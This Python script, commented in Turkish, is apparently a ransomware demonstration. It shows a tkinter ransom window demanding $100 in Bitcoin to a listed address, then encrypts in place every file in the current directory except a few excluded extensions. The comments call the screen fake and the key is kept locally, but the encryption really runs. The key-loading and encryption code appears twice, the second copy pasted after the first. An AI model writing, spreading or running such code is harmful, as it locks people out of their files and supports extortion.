from cryptography.fernet import Fernet
from os import listdir, path
import tkinter as tk
from time import sleep

# Anahtar üret veya oku
def load_key():
    if path.exists("encryption.key"):
        with open("encryption.key", "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open("encryption.key", "wb") as key_file:
            key_file.write(key)
        return key

KEY_1 = load_key()
ENC = Fernet(KEY_1)

def Encrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    encrypted_data = ENC.encrypt(data)
    with open(file_name, 'wb') as file:
        file.write(encrypted_data)

def Decrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    decrypted_data = ENC.decrypt(data)
    with open(file_name, 'wb') as file:
        file.write(decrypted_data)

# Hedef dizin
TARGET_DIR = "."
EXCLUDE = ['.py', '.exe', '.dll', '.key','log']

# Sahte ransom ekranı
def show_fake_ransomware_screen():
    window = tk.Tk()
    window.title("Your Files Are Encrypted!")
    window.geometry("400x300")
    
    # Mesaj ekle
    label = tk.Label(window, text="WARNING: All your files are encrypted.\nTo recover them, pay $100 to the following address:\nBitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", font=("Helvetica", 12), justify=tk.CENTER)
    label.pack(pady=20)
    
    # "Encrpting..." mesajı
    encrypting_label = tk.Label(window, text="Encrypting files...", font=("Helvetica", 10), fg="red")
    encrypting_label.pack(pady=10)

    # Sahte bir yüklenme işlemi
    window.after(1000, lambda: encrypting_label.config(text="Encrypting files... Please wait"))
    
    # Ekranı 5 saniye göster
    window.after(5000, window.destroy)
    window.mainloop()

# Dosyaları şifrele
def encrypt_files():
    for filename in listdir(TARGET_DIR):
        filepath = path.join(TARGET_DIR, filename)
        if path.isfile(filepath) and not any(filepath.endswith(ext) for ext in EXCLUDE):
            Encrypt(filepath)

    print("Encryption completed! Key saved to encryption.key")

# Sahte ransomware ekranını göster
show_fake_ransomware_screen()

# Şifreleme işlemi başlat
encrypt_files()


# Anahtar üret veya oku
def load_key():
    if path.exists("encryption.key"):
        with open("encryption.key", "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open("encryption.key", "wb") as key_file:
            key_file.write(key)
        return key

KEY_1 = load_key()
ENC = Fernet(KEY_1)

def Encrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    encrypted_data = ENC.encrypt(data)
    with open(file_name, 'wb') as file:
        file.write(encrypted_data)

def Decrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    decrypted_data = ENC.decrypt(data)
    with open(file_name, 'wb') as file:
        file.write(decrypted_data)

# Hedef dizin
TARGET_DIR = "."
EXCLUDE = ['.py', '.exe', '.dll', '.key','log']

for filename in listdir(TARGET_DIR):
    filepath = path.join(TARGET_DIR, filename)
    if path.isfile(filepath) and not any(filepath.endswith(ext) for ext in EXCLUDE):
        Encrypt(filepath)

print("Encryption completed! Key saved to encryption.key")
